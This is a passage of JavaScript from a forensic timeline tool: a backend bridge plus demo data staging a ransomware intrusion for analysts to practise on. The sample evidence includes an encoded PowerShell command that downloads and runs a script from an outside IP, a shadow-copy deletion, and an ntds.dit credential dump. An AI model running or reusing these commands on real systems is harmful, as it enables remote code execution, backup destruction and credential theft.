// Backend bridge.
//
// The frontend speaks only to this module. In the packaged Tauri app it calls
// the Rust commands (commands.rs) over the __TAURI__ bridge. Run standalone in a
// plain browser (no bridge present) it serves representative sample data so the
// interface is fully exercisable without the Rust build — the same DTO shapes
// the real backend returns (see commands.rs / contract).
//
// Every function here returns the exact shape the corresponding #[tauri::command]
// returns. Keep in sync with crates/gui/src/commands.rs.

const hasTauri = typeof window !== "undefined"
  && window.__TAURI__
  && window.__TAURI__.core
  && typeof window.__TAURI__.core.invoke === "function";

async function call(cmd, args) {
  if (hasTauri) {
    return window.__TAURI__.core.invoke(cmd, args);
  }
  return sample(cmd, args);
}

// Multi-host cases: the host the analyst is looking at (null = all hosts).
// Applied to the timeline filter and to every per-case summary below.
let hostScope = null;
const withHost = (filter) => (hostScope ? Object.assign({}, filter, { host: hostScope }) : filter);

export const backend = {
  setHostScope: (h) => { hostScope = h || null; },
  hostScope: () => hostScope,
  openCase: (path) => call("open_case", { path }),
  addCollection: (collection_dir, host_name) =>
    call("add_collection", { collectionDir: collection_dir, hostName: host_name || null }),
  listHosts: () => call("list_hosts", {}),
  renameHost: (old_name, new_name) => call("rename_host", { oldName: old_name, newName: new_name }),
  caseOverview: () => call("case_overview", { host: hostScope }),
  ingest: (collection_dir, case_path, case_name, examiner) =>
    call("ingest_collection", { collectionDir: collection_dir, casePath: case_path, caseName: case_name, examiner }),
  queryTimeline: (filter) => call("query_timeline", { filter: withHost(filter) }),
  countTimeline: (filter) => call("count_timeline", { filter: withHost(filter) }),
  // The Host menu lists every host; the others respect the host being viewed.
  columnValues: (filter, field) => call("column_values", { filter: field === "host" ? Object.assign({}, filter, { host: null }) : withHost(filter), field }),
  eventRaw: (event_id) => call("event_raw", { eventId: event_id }),
  runHunt: (rules_dir) => call("run_hunt", { rulesDir: rules_dir || null }),
  huntResults: () => call("hunt_results", {}),
  setTriage: (event_id, triage_state, note) => call("set_triage", { eventId: event_id, triageState: triage_state, note: note || null }),
  clearTriage: (event_id) => call("clear_triage", { eventId: event_id }),
  listTriage: () => call("list_triage", {}),
  exportFindings: (format, path, states) => call("export_findings", { format, path, states: states || null, host: hostScope }),
  exportCounts: () => call("export_counts", { host: hostScope }),
  exportReport: (path) => call("export_report", { path, host: hostScope }),
  iocPreview: (text) => call("ioc_preview", { text }),
  iocSweep: (text) => call("ioc_sweep", { text }),
  readIocFile: (path) => call("read_ioc_file", { path }),
  eventsByIds: (ids) => call("events_by_ids", { ids }),
  iocSaved: () => call("ioc_saved", {}),
  iocSaveList: (text) => call("ioc_save_list", { text }),
  listLabels: () => call("list_labels", {}),
  addLabel: (eventId, tag) => call("add_label", { eventId, tag }),
  removeLabel: (eventId, tag) => call("remove_label", { eventId, tag }),
  // Files dropped onto the window (Tauri delivers paths, not File objects).
  onFileDrop: async (handler) => {
    try {
      const wv = window.__TAURI__ && window.__TAURI__.webview && window.__TAURI__.webview.getCurrentWebview();
      if (!wv || !wv.onDragDropEvent) return false;
      await wv.onDragDropEvent((ev) => {
        const p = ev.payload || {};
        handler(p.type, p.paths || []);
      });
      return true;
    } catch (e) { return false; }
  },
  pickIocFile: async () => {
    if (!hasTauri) return null;
    return window.__TAURI__.dialog.open({
      directory: false, multiple: false, title: "Load an IOC list",
      filters: [{ name: "IOC list", extensions: ["txt", "csv", "tsv", "ioc", "json", "log"] }, { name: "All files", extensions: ["*"] }],
    });
  },
  pickSigmaFolder: async () => {
    if (!hasTauri) return "C:\\sigma\\rules\\windows";
    return window.__TAURI__.dialog.open({ directory: true, multiple: false, title: "Choose a Sigma rules folder (e.g. rules\\windows from a SigmaHQ release)" });
  },
  sigmaPreview: (config) => call("sigma_preview", { config }),
  sigmaHunt: (config) => call("sigma_hunt", { config }),
  sigmaSaved: () => call("sigma_saved", {}),
  hostInfo: () => call("host_info", { host: hostScope }),
  ingestLog: () => call("ingest_log", { host: hostScope }),
  dailyActivity: () => call("daily_activity", { host: hostScope }),
  lateralMovement: () => call("lateral_movement", {}),
  pickExportFile: async (format) => {
    if (!hasTauri) return null;
    const ext = format === "stix" ? "json" : format === "html" ? "html" : "csv";
    const base = format === "stix" ? "findings-stix" : format === "html" ? "case-report" : "findings";
    // One host's export is named after it, so the files don't get mixed up.
    const tag = hostScope ? "-" + String(hostScope).replace(/[^A-Za-z0-9._-]+/g, "_") : "";
    const name = `${base}${tag}.${ext}`;
    return window.__TAURI__.dialog.save({
      title: format === "html" ? "Save case report" : "Export findings as " + format.toUpperCase(),
      defaultPath: name,
      filters: [{ name: format.toUpperCase(), extensions: [ext] }],
    });
  },
  isLive: () => hasTauri,
  // Long-job progress: the Rust side emits "fx-progress" ~4x a second while
  // ingest / detections run. Demo mode feeds the same handler from sample().
  onProgress: async (handler) => {
    if (!hasTauri) { demoProgressHandlers.push(handler); return true; }
    try {
      const ev = window.__TAURI__.event;
      if (!ev || !ev.listen) return false;
      await ev.listen("fx-progress", (e) => handler(e.payload || {}));
      return true;
    } catch (e) { return false; }
  },
  cancelJob: () => call("cancel_job", {}),
  allowlistGet: () => call("allowlist_get", {}),
  allowlistSet: (entries) => call("allowlist_set", { entries }),
  sigmaDisableRule: (ruleId) => call("sigma_disable_rule", { ruleId }),
  progressSnapshot: () => call("progress_snapshot", {}),

  // Native pickers (Tauri dialog plugin). Return null if the user cancels or
  // if we're running outside Tauri (plain browser demo mode).
  previewCollection: (collection_dir) => call("preview_collection", { collectionDir: collection_dir }),
  pathExists: (path) => call("path_exists", { path }),
  pickFolder: async (title) => {
    if (!hasTauri) return window.__fxDemoPick ? "C:\\cases\\demo-collection" : null;
    return window.__TAURI__.dialog.open({ directory: true, multiple: false, title });
  },
  pickSaveFile: async (title, defaultName) => {
    if (!hasTauri) return window.__fxDemoPick ? "C:\\cases\\demo.fxcase" : null;
    return window.__TAURI__.dialog.save({
      title,
      defaultPath: defaultName || "case.fxcase",
      filters: [{ name: "fx case", extensions: ["fxcase"] }],
    });
  },
  pickOpenFile: async (title) => {
    if (!hasTauri) return null;
    return window.__TAURI__.dialog.open({
      directory: false, multiple: false, title,
      filters: [{ name: "fx case", extensions: ["fxcase"] }],
    });
  },
};

// ── Sample data ─────────────────────────────────────────────────────────────
// A small but representative slice of a commodity-ransomware intrusion, chosen
// to exercise every category and the flagged path: initial access, tooling
// drop in a staging dir, persistence, RDP lateral movement, a masqueraded
// binary, SRUM exfil, and pre-encryption anti-forensics.

const HOST = "WKSTN-07";
const T = (h, m, s) => `2026-02-11T${String(h).padStart(2,"0")}:${String(m).padStart(2,"0")}:${String(s).padStart(2,"0")}Z`;

let SEED = [
  ev(T(2,10,5),  "network","browser.download","BrowserHistory",null,"Download from cdn.discordapp.com -> C:\\Users\\jodell\\Downloads\\invoice.scr", true, "STAGING"),
  ev(T(2,45,2),  "network","browser.visit","BrowserHistory",null,"Visited lockbitblog.example.onion — Leak Site", true, "LEAKSITE"),
  ev(T(2,44,0),  "network","browser.visit","BrowserHistory",null,"Visited gofile.io — file upload", true, "EXFIL"),
  ev(T(2,14,3),  "logon","logon.success","Evtx","svc_backup","Successful logon (type 10) from 10.4.2.9", false),
  ev(T(2,15,1),  "filesystem","file.create","UsnJrnl",null,"mimikatz.exe","file.create: C:\\Users\\Public\\mimikatz.exe", true, "STAGING"),
  ev(T(2,15,2),  "execution","execution.amcache_suspicious","Amcache",null,"AmCache presence: c:\\users\\public\\mimikatz.exe (SHA1 a1b2c3…)  [STAGING: executable in common staging directory]", true, "STAGING"),
  ev(T(2,16,40), "persistence","persistence.run_key","RegistryRun",null,"Run-key persistence: Updater -> C:\\ProgramData\\upd.exe", true, "STAGING"),
  ev(T(2,17,12), "execution","execution.prefetch","Prefetch",null,"Prefetch: RCLONE.EXE executed (run 1 of last 8, total runs 3)", false),
  ev(T(2,17,20), "network","network.usage","Srum","S-1-5-21…-1013","SRUM net: c:\\programdata\\upd.exe sent 4831838208 / recv 20551 bytes", false),
  ev(T(2,18,5),  "persistence","service.define","RegistryService",null,"Service PSEXESVC: image=C:\\Windows\\PSEXESVC.exe start=3", false),
  ev(T(2,18,9),  "network","rdp.enabled","RegistryGeneric",null,"RDP ENABLED (fDenyTSConnections=0)", false),
  ev(T(2,19,0),  "execution","execution.amcache_suspicious","Amcache",null,"AmCache presence: c:\\windows\\temp\\svchost.exe (SHA1 dead…)  [MASQUERADE: system binary at non-System32 path]", true, "MASQUERADE"),
  ev(T(2,22,31), "filesystem","file.rename","UsnJrnl",null,"finance_q4.xlsx.lockbit","USN RENAME_NEW_NAME: finance_q4.xlsx.lockbit", true, "ANTI-FORENSIC"),
  ev(T(2,22,31), "filesystem","file.delete","UsnJrnl",null,"aaaaaaaa.tmp","USN FILE_DELETE: aaaaaaaa.tmp", true, "ANTI-FORENSIC"),
  ev(T(2,22,44), "execution","execution.userassist","UserAssist","S-1-5-21…-1013","UserAssist run: C:\\Users\\jodell\\Downloads\\invoice.scr", false),
  ev(T(1,58,10), "logon","logon.failure","Evtx","administrator","Failed logon", false),
  ev(T(2,20,15), "filesystem","file.modified","Mft",null,"$SI modified: C:\\ProgramData\\upd.exe", false),
  ev(T(2,16,2),  "execution","process.create","Evtx","jodell","Process created: powershell.exe -nop -w hidden -enc SQBFAFgAIAAo…", true, "ENCODED"),
];
// Demo: give the encoded PowerShell event a real command line so Decode has something to peel.
SEED[SEED.length - 1]._raw = { EventID: 4688, NewProcessName: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  CommandLine: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAAvAGEALgBwAHMAMQAnACkA" };
// Demo: an $MFT entry whose $SI Born predates its $FN Born (timestomped), and
// a shell link with no time at all (undated: shown as "no timestamp").
(function demoTimes() {
  const si = { modified: "2019-03-01 0:00:00.0 +00:00:00", accessed: "2026-02-11 2:15:40.5310 +00:00:00", changed: "2026-02-11 2:15:41.0712 +00:00:00", born: "2019-03-01 0:00:00.0 +00:00:00" };
  const fn = { modified: "2026-02-11 2:15:00.8841 +00:00:00", accessed: "2026-02-11 2:15:00.8841 +00:00:00", changed: "2026-02-11 2:15:00.8841 +00:00:00", born: "2026-02-11 2:15:00.8841 +00:00:00" };
  const a = ev(T(2,15,0), "filesystem", "file.timestomp_suspected", "Mft", null, "Possible timestomping: $SI Born 2019-03-01 00:00:00 is earlier than $FN Born 2026-02-11 02:15:00; $SI times have no sub-second part but $FN times do: Users/Public/svc.exe  [ANTI-FORENSIC]", true, "ANTI-FORENSIC");
  a.ts_kind = "created"; a._rawTop = { entry: 88123, path: "Users/Public/svc.exe", si, fn, signals: ["$SI Born earlier than $FN Born"] };
  const b = ev(T(2,15,41), "filesystem", "file.metadata_changed", "Mft", null, "$SI metadata_changed: Users/Public/svc.exe", false);
  b.ts_kind = "metadatachanged"; b._rawTop = { entry: 88123, path: "Users/Public/svc.exe", si, fn };
  const c = ev("", "other", "file.shortcut", "Lnk", null, "Shell link -> E:\\Tools\\stage.zip  [REMOVABLE-MEDIA]", false);
  c.ts_kind = "undated";
  SEED.push(a, b, c);
})();


// pad with routine noise so virtualization is real (a few thousand rows)
(function pad() {
  const arts = [["execution","execution.prefetch","Prefetch"],["filesystem","file.modified","Mft"],
                ["logon","logon.success","Evtx"],["execution","execution.bam","BamDam"]];
  const names = ["explorer.exe","chrome.exe","OUTLOOK.EXE","teams.exe","MsMpEng.exe","cmd.exe","powershell.exe"];
  let base = new Date("2026-02-11T00:00:00Z").getTime();
  for (let i = 0; i < 4200; i++) {
    const a = arts[i % arts.length];
    const t = new Date(base + i * 15000).toISOString().replace(".000","");
    SEED.push(ev(t, a[0], a[1], a[2], null, `${a[1]}: C:\\Windows\\System32\\${names[i%names.length]}`, false));
  }
  SEED.sort((x, y) => ((x.ts || "~") < (y.ts || "~") ? -1 : (x.ts || "~") > (y.ts || "~") ? 1 : 0)); // undated last
})();

// Demo: EVTX rows carry the Event ID their action would have.
function ev(ts, category, action, artefact, user, message, flagged, tag) {
  return {
    id: "e" + Math.random().toString(36).slice(2, 10),
    ts, ts_kind: kindFor(action), artefact, category, action,
    host: HOST, user, target: null, message, flagged: !!flagged, _tag: tag || null,
    event_id: artefact === "Evtx" ? ({ "logon.success": "4624", "logon.failure": "4625", "process.create": "4688", "service.install": "7045", "log.cleared": "1102", "task.created": "4698" })[action] || null : null,
  };
}
function kindFor(a) {
  if (a.startsWith("logon")) return "logon";
  if (a.startsWith("execution")) return "executed";
  if (a.startsWith("file.")) return a === "file.create" ? "created" : "recorded";
  if (a.startsWith("network")) return "recorded";
  return "recorded";
}

// ── Demo progress (standalone preview only) ─────────────────────────────────
const demoProgressHandlers = [];
let demoCancel = false;
let demoSnap = {};
function demoEmit(s) { demoSnap = s; demoProgressHandlers.forEach((h) => { try { h(s); } catch (e) {} }); }
function demoJob(kind, ms) {
  demoCancel = false;
  const files = [["Mft", "C/$MFT", 412e6], ["Evtx", "C/Windows/System32/winevt/Logs/Security.evtx", 68e6],
    ["Evtx", "C/Windows/System32/winevt/Logs/Microsoft-Windows-Sysmon%4Operational.evtx", 128e6],
    ["Registry", "C/Windows/System32/config/SOFTWARE", 84e6], ["Prefetch", "C/Windows/Prefetch/POWERSHELL.EXE-022A1004.pf", 4e4],
    ["BrowserHistory", "C/Users/j.smith/AppData/Local/Google/Chrome/User Data/Default/History", 12e6]];
  const totalBytes = files.reduce((a, f) => a + f[2], 0);
  const t0 = Date.now();
  return new Promise((resolve) => {
    const tick = () => {
      const f = Math.min(1, (Date.now() - t0) / ms);
      let s;
      if (kind === "ingest") {
        let acc = 0, done = 0, cur = files[files.length - 1];
        for (const x of files) { if ((acc + x[2]) / totalBytes <= f) { acc += x[2]; done++; } else { cur = x; break; } }
        s = { phase: f < 1 ? "Hashing and parsing artefacts" : "Building indexes", current: f < 1 ? cur.join("|") : "",
          files_done: done, files_total: files.length, bytes_done: acc, bytes_total: totalBytes,
          events: Math.round(f * 2480000), warnings: done > 2 ? 3 : 0, failed: 0, scanned: 0, scan_total: 0, cancelled: demoCancel };
      } else {
        s = { phase: kind, current: "", files_done: 0, files_total: 0, bytes_done: 0, bytes_total: 0, events: 0,
          scanned: Math.round(f * 2480000), scan_total: 2480000, warnings: 0, failed: 0, cancelled: demoCancel };
      }
      demoEmit(s);
      if (f >= 1 || demoCancel) resolve(); else setTimeout(tick, 250);
    };
    tick();
  });
}

// ── Demo: multi-host ────────────────────────────────────────────────────────
// The preview starts with one host. "+ Add host" (with window.__fxDemoPick set)
// adds the domain controller the intruder moved to next.
const HN = { wk: "WKSTN-07", dc: "SRV-DC01" };
const DEMO_HOSTS = [{ key: "wk", host_source: "SYSTEM hive ComputerName",
  collections: [{ collection_id: "c1", source_root: "C:\\cases\\WKSTN-07", ingested_utc: "2026-02-12T09:00:00", files: 214 }] }];
function demoHosts() {
  return DEMO_HOSTS.map((h) => ({ host: HN[h.key], host_source: h.host_source, collections: h.collections,
    events: SEED.filter((e) => e.host === HN[h.key]).length }));
}
function addDemoHost() {
  if (DEMO_HOSTS.some((h) => h.key === "dc")) return false;
  const D = (h, m, s) => `2026-02-11T${String(h).padStart(2,"0")}:${String(m).padStart(2,"0")}:${String(s).padStart(2,"0")}Z`;
  const add = (...a) => { const e = ev(...a); e.host = HN.dc; SEED.push(e); return e; };
  add(D(2,20,41), "logon", "logon.success", "Evtx", "svc_backup", "Successful logon (type 3) from 10.20.4.37 (WKSTN-07)", true, "LATERAL");
  add(D(2,20,44), "persistence", "service.install", "Evtx", "svc_backup", "Service installed: PSEXESVC (C:\\Windows\\PSEXESVC.exe)", true, "LATERAL");
  add(D(2,21,10), "execution", "process.create", "Evtx", "svc_backup", "Process created: ntdsutil.exe \"ac i ntds\" ifm \"create full C:\\ProgramData\\ifm\" q q", true, "CRED");
  add(D(2,21,58), "filesystem", "file.create", "UsnJrnl", null, "USN FILE_CREATE: C:\\ProgramData\\ifm\\Active Directory\\ntds.dit", true, "STAGING");
  add(D(2,23,2), "execution", "process.create", "Evtx", "svc_backup", "Process created: vssadmin.exe delete shadows /all /quiet", true, "ANTI-FORENSIC");
  const arts = [["logon","logon.success","Evtx"],["filesystem","file.modified","Mft"],["execution","execution.prefetch","Prefetch"]];
  const base = new Date("2026-02-11T00:30:00Z").getTime();
  for (let i = 0; i < 900; i++) {
    const a = arts[i % arts.length];
    const e = ev(new Date(base + i * 20000).toISOString().replace(".000",""), a[0], a[1], a[2], null, `${a[1]}: C:\\Windows\\System32\\${["lsass.exe","dns.exe","dfsrs.exe","svchost.exe"][i % 4]}`, false);
    e.host = HN.dc; SEED.push(e);
  }
  SEED.sort((x, y) => ((x.ts || "~") < (y.ts || "~") ? -1 : (x.ts || "~") > (y.ts || "~") ? 1 : 0));
  DEMO_HOSTS.push({ key: "dc", host_source: "SYSTEM hive ComputerName",
    collections: [{ collection_id: "c2", source_root: "C:\\cases\\demo-collection", ingested_utc: "2026-02-12T10:30:00", files: 188 }] });
  return true;
}
const hasDC = () => DEMO_HOSTS.some((h) => h.key === "dc");
const scopeRows = (h) => (h ? SEED.filter((e) => e.host === h) : SEED);

function sample(cmd, args) {
  if (cmd === "cancel_job") { demoCancel = true; return Promise.resolve(null); }
  if (cmd === "list_hosts") { return Promise.resolve(demoHosts()); }
  if (cmd === "preview_collection") {
    const g = (kind, files, mb, ex) => ({ kind, files, bytes: Math.round(mb * 1048576), examples: ex });
    return new Promise((res) => setTimeout(() => res({
      total_files: 1284, total_bytes: 2147483648 * 1.6, profile: "KAPE", host_hint: "WS-FIN-042",
      groups: [
        g("Lnk", 412, 3.1, ["C/Users/jsmith/AppData/Roaming/Microsoft/Windows/Recent/invoice.lnk"]),
        g("Evtx", 148, 690, ["C/Windows/System32/winevt/Logs/Security.evtx", "C/Windows/System32/winevt/Logs/System.evtx"]),
        g("Prefetch", 212, 9.4, ["C/Windows/prefetch/RCLONE.EXE-1A2B3C4D.pf"]),
        g("ScheduledTask", 96, 0.8, ["C/Windows/System32/Tasks/Microsoft/Windows/Defrag/ScheduledDefrag"]),
        g("JumpList", 44, 2.2, []), g("RegistryGeneric", 9, 180, ["C/Windows/System32/config/SYSTEM", "C/Windows/System32/config/SOFTWARE"]),
        g("BrowserHistory", 6, 24, ["C/Users/jsmith/AppData/Local/Microsoft/Edge/User Data/Default/History"]),
        g("Mft", 1, 512, ["C/$MFT"]), g("UsnJrnl", 1, 1024, ["C/$Extend/$UsnJrnl:$J"]), g("Srum", 1, 40, ["C/Windows/System32/sru/SRUDB.dat"]),
        g("Amcache", 1, 6, ["C/Windows/AppCompat/Programs/Amcache.hve"]), g("PsHistory", 1, 0.01, []),
      ],
      transaction_logs: 26, unrecognised: 47, errors: [],
    }), 700));
  }
  if (cmd === "path_exists") return Promise.resolve(/existing/i.test(args.path || ""));
  if (cmd === "add_collection") {
    if (hasDC()) return Promise.reject(new Error("this collection folder is already in this case"));
    return demoJob("ingest", 4000).then(() => {
      addDemoHost();
      if (args.hostName) { const old = HN.dc; HN.dc = args.hostName; SEED.forEach((e) => { if (e.host === old) e.host = HN.dc; }); }
      return { overview: overview(null), host: HN.dc, merged: false, events: 905 };
    });
  }
  if (cmd === "rename_host") {
    const key = Object.keys(HN).find((k) => HN[k] === args.oldName);
    if (!key) return Promise.resolve(null);
    if (Object.values(HN).includes(args.newName)) return Promise.reject(new Error(`There's already a host called ${args.newName}. Pick another name.`));
    HN[key] = args.newName;
    SEED.forEach((e) => { if (e.host === args.oldName) e.host = args.newName; });
    return Promise.resolve(null);
  }
  if (cmd === "case_overview") { return Promise.resolve(overview(args.host)); }
  if (cmd === "progress_snapshot") { return Promise.resolve(demoSnap); }
  if (cmd === "ingest_collection" && window.__fxDemoPick) {
    return demoJob("ingest", 6000).then(() => overview());
  }
  if (cmd === "run_hunt" && window.__fxDemoPick) {
    return demoJob("Running detections", 3000).then(() => sampleDetections());
  }
  if (cmd === "open_case" || cmd === "ingest_collection") {
    return Promise.resolve(overview(null));
  }
  if (cmd === "query_timeline") {
    return Promise.resolve(applyFilter(SEED, args.filter));
  }
  if (cmd === "column_values") {
    const f = Object.assign({}, args.filter, { limit: 1e9, offset: 0 });
    if (args.field === "label") {
      const f2 = Object.assign({}, args.filter, { limit: 1e9, offset: 0, label: null });
      const vis = new Set(applyFilter(SEED, f2).map((e) => e.id)), c = {};
      SAMPLE_LABELS.forEach((l) => { if (vis.has(l.event_id)) c[l.tag] = (c[l.tag] || 0) + 1; });
      return Promise.resolve(Object.entries(c).map(([label, count]) => ({ label, count })));
    }
    if (args.field === "triage") {
      const f2 = Object.assign({}, args.filter, { limit: 1e9, offset: 0, triage: null });
      const vis = new Set(applyFilter(SEED, f2).map((e) => e.id)), c = {};
      DEMO_TRIAGE.forEach((t) => { if (vis.has(t.event_id)) c[t.triage_state] = (c[t.triage_state] || 0) + 1; });
      return Promise.resolve(Object.entries(c).map(([label, count]) => ({ label, count })));
    }
    const key = { host: "host", kind: "ts_kind", artefact: "artefact", user: "user" }[args.field];
    delete f[args.field === "host" ? "host" : args.field];
    const counts = {};
    applyFilter(SEED, f).forEach((e) => { const v = e[key]; if (v) counts[v] = (counts[v] || 0) + 1; });
    return Promise.resolve(Object.entries(counts).map(([label, count]) => ({ label, count })).sort((a, b) => b.count - a.count));
  }
  if (cmd === "count_timeline") {
    // Demo: count is the full filtered set (before paging).
    const f = Object.assign({}, args.filter, { limit: 1e9, offset: 0 });
    return Promise.resolve(applyFilter(SEED, f).length);
  }
  if (cmd === "event_raw") {
    const e = SEED.find((x) => x.id === args.eventId);
    return Promise.resolve(e ? JSON.stringify(rawFor(e), null, 2) : null);
  }
  if (cmd === "run_hunt" || cmd === "hunt_results") {
    // Demo only: the real app derives tactics from MITRE's ATT&CK data.
    const TAC = { T1486: "Impact", T1490: "Impact", T1657: "Impact", T1048: "Exfiltration", T1567: "Exfiltration", "T1567.002": "Exfiltration",
      "T1036.005": "Stealth", T1003: "Credential Access", "T1003.001": "Credential Access", "T1021.002": "Lateral Movement", "T1021.001": "Lateral Movement",
      T1189: "Initial Access", T1033: "Discovery", "T1059.001": "Execution" };
    const ORDER = ["Initial Access", "Execution", "Persistence", "Privilege Escalation", "Stealth", "Defense Impairment", "Credential Access", "Discovery", "Lateral Movement", "Collection", "Command and Control", "Exfiltration", "Impact"];
    return Promise.resolve(demoApplyAllow().live.map((d) => ({ ...d,
      tactics: [...new Set((d.attack || []).map((t) => TAC[t]).filter(Boolean))].sort((a, b) => ORDER.indexOf(a) - ORDER.indexOf(b)) })));
  }
  if (cmd === "allowlist_get" || cmd === "allowlist_set") {
    if (cmd === "allowlist_set") DEMO_ALLOW.splice(0, DEMO_ALLOW.length, ...(args.entries || []));
    const r = demoApplyAllow(), counts = {};
    r.suppressed.forEach((x) => { counts[x.allow_id] = (counts[x.allow_id] || 0) + 1; });
    return Promise.resolve({ entries: DEMO_ALLOW.slice(), counts, suppressed: r.suppressed });
  }
  if (cmd === "sigma_disable_rule") {
    const r = SAMPLE_KV.sigma;
    for (let i = SAMPLE_SIGMA_DETS.length - 1; i >= 0; i--) if (SAMPLE_SIGMA_DETS[i].rule_id === args.ruleId) SAMPLE_SIGMA_DETS.splice(i, 1);
    if (r) {
      const h = r.hits.find((x) => x.rule_id === args.ruleId);
      r.hits = r.hits.filter((x) => x.rule_id !== args.ruleId);
      r.rules_hit = r.hits.length; r.findings -= h ? h.findings : 0; r.disabled = (r.disabled || 0) + 1;
    }
    return Promise.resolve(r || null);
  }
  if (cmd === "export_findings") { return Promise.resolve(sampleDetections().length); }
  if (cmd === "export_report") { return Promise.resolve(0); }
  if (cmd === "sigma_preview") {
    return Promise.resolve({ files_seen: 2424, loaded: 2055, filtered: 330, folder_error: null,
      skipped_by_reason: { "unsupported modifier |cidr": 16, "unsupported modifier |base64offset": 7, "log source not mapped (file_access)": 6, "keyword search with modifiers": 6, "other": 4 },
      skipped_examples: [], loaded_by_source: { process_creation: 1038, registry_set: 180, file_event: 143, ps_script: 139, security: 117 } });
  }
  if (cmd === "sigma_hunt") {
    const ids = SEED.slice(10, 14).map((e) => e.id);
    SAMPLE_KV.sigma = { folder: args.config.folder, loaded: 2055, filtered: 330, files_seen: 2424,
      skipped_by_reason: { "unsupported modifier |cidr": 16, "unsupported modifier |base64offset": 7, "log source not mapped (file_access)": 6, "keyword search with modifiers": 6, "other": 4 },
      skipped_examples: [], loaded_by_source: { process_creation: 1038 }, folder_error: null, rules_hit: 2, findings: 5, errors: [],
      hits: [
        { rule_id: "sigma:demo-1", sigma_id: "demo-1", title: "Whoami Utility Execution", level: "medium", author: "Florian Roth", logsource: "process_creation", findings: 3, events: 3, first_seen: "2026-02-11T00:02:30", last_seen: "2026-02-11T00:03:30" },
        { rule_id: "sigma:demo-2", sigma_id: "demo-2", title: "Suspicious Encoded PowerShell Command Line", level: "high", author: "Teymur Kheirkhabarov", logsource: "process_creation", findings: 2, events: 2, first_seen: "2026-02-11T00:05:00", last_seen: "2026-02-11T00:05:30" },
      ] };
    SAMPLE_SIGMA_DETS.length = 0;
    SAMPLE_SIGMA_DETS.push({ rule_id: "sigma:demo-1", title: "Whoami Utility Execution", severity: "medium", attack: ["T1033"], summary: "whoami", event_ids: ids.slice(0, 3), ts: "2026-02-11T00:02:30", host: "WKSTN-07", engine: "sigma" },
      { rule_id: "sigma:demo-2", title: "Suspicious Encoded PowerShell Command Line", severity: "high", attack: ["T1059.001"], summary: "powershell -enc", event_ids: ids.slice(3), ts: "2026-02-11T00:05:00", host: "WKSTN-07", engine: "sigma" });
    return Promise.resolve(SAMPLE_KV.sigma);
  }
  if (cmd === "host_info" && args.host && args.host === HN.dc) {
    const id = (SEED.find((e) => e.host === HN.dc) || {}).id || "";
    return Promise.resolve({
      computer_name: { value: HN.dc, event_id: id, source: "C/Windows/System32/config/SYSTEM" },
      domain: { value: "corp.example", event_id: id, source: "C/Windows/System32/config/SYSTEM" },
      os: { value: { product: "Windows Server 2022 Standard", version: "21H2", build: "20348", ubr: 2700, edition: "ServerStandard" }, event_id: id, source: "C/Windows/System32/config/SOFTWARE" },
      timezone: { value: { name: "GMT Standard Time", utc_offset: "UTC+00:00", active_utc_offset: "UTC+00:00" }, event_id: id, source: "C/Windows/System32/config/SYSTEM" },
      interfaces: [{ value: { ip: "10.20.0.10", dhcp: false, subnet_mask: "255.255.255.0", gateway: "10.20.0.1", dns: "127.0.0.1" }, event_id: id, source: "C/Windows/System32/config/SYSTEM" }],
      accounts: [], collection_tool: "KAPE", asserted_host: HN.dc, evidence_files: 188, evidence_bytes: 2410000000, other_names: [],
    });
  }
  if (cmd === "host_info") {
    const ev = (i) => (SEED[i] || {}).id || "";
    return Promise.resolve({
      computer_name: { value: HN.wk, event_id: ev(1), source: "C/Windows/System32/config/SYSTEM" },
      domain: { value: "corp.example", event_id: ev(1), source: "C/Windows/System32/config/SYSTEM" },
      os: { value: { product: "Windows 11 Pro", version: "23H2", build: "22631", ubr: 4317, edition: "Professional", install_date: "2024-03-02T09:14:00Z", registered_owner: "IT" }, event_id: ev(2), source: "C/Windows/System32/config/SOFTWARE" },
      timezone: { value: { name: "GMT Standard Time", utc_offset: "UTC+00:00", active_utc_offset: "UTC+00:00",
        rule: { name: "GMT Standard Time", bias: 0, standard_bias: 0, daylight_bias: -60,
          standard_start: { year: 0, month: 10, day_of_week: 0, day: 5, hour: 2, minute: 0 },
          daylight_start: { year: 0, month: 3, day_of_week: 0, day: 5, hour: 1, minute: 0 } } }, event_id: ev(3), source: "C/Windows/System32/config/SYSTEM" },
      last_shutdown: { value: "2026-02-10T18:02:11Z", event_id: ev(4), source: "C/Windows/System32/config/SYSTEM" },
      interfaces: [
        { value: { ip: "10.20.4.37", dhcp: true, subnet_mask: "255.255.255.0", gateway: "10.20.4.1", dns: "10.20.0.10", dhcp_server: "10.20.0.5", lease_obtained: "2026-02-10T08:01:00Z" }, event_id: ev(5), source: "C/Windows/System32/config/SYSTEM" },
        { value: { ip: "192.168.56.10", dhcp: false, subnet_mask: "255.255.255.0", gateway: null, dns: null }, event_id: ev(6), source: "C/Windows/System32/config/SYSTEM" },
      ],
      accounts: [
        { user: "Administrator", rid: 500, created: "2024-03-02T09:10:00Z", last_logon: null, logon_count: 0, password_last_set: null, disabled: true, local: true, event_id: ev(7) },
        { user: "helpdesk", rid: 1001, full_name: "Help Desk", created: "2026-02-10T23:58:00Z", last_logon: "2026-02-11T00:04:00Z", logon_count: 3, password_last_set: "2026-02-10T23:58:00Z", disabled: false, local: true, sid: "S-1-5-21-1-2-3-1001", profile_path: "C:\\Users\\helpdesk", event_id: ev(8) },
        { user: "j.smith", local: false, sid: "S-1-5-21-9-8-7-1104", profile_path: "C:\\Users\\j.smith", event_id: ev(9) },
      ],
      collection_tool: "KAPE", asserted_host: HN.wk, evidence_files: 214, evidence_bytes: 1830000000, other_names: [],
    });
  }
  if (cmd === "sigma_saved") { return Promise.resolve({ config: null, results: SAMPLE_KV.sigma || null }); }
  if (cmd === "events_by_ids") { const want = new Set(args.ids || []); return Promise.resolve(SEED.filter((e) => want.has(e.id))); }
  if (cmd === "ioc_saved") { return Promise.resolve({ text: SAMPLE_KV.ioc || "", results: SAMPLE_KV.iocResults || null }); }
  if (cmd === "ioc_save_list") { SAMPLE_KV.ioc = args.text; return Promise.resolve(); }
  if (cmd === "list_labels") { return Promise.resolve(SAMPLE_LABELS.slice()); }
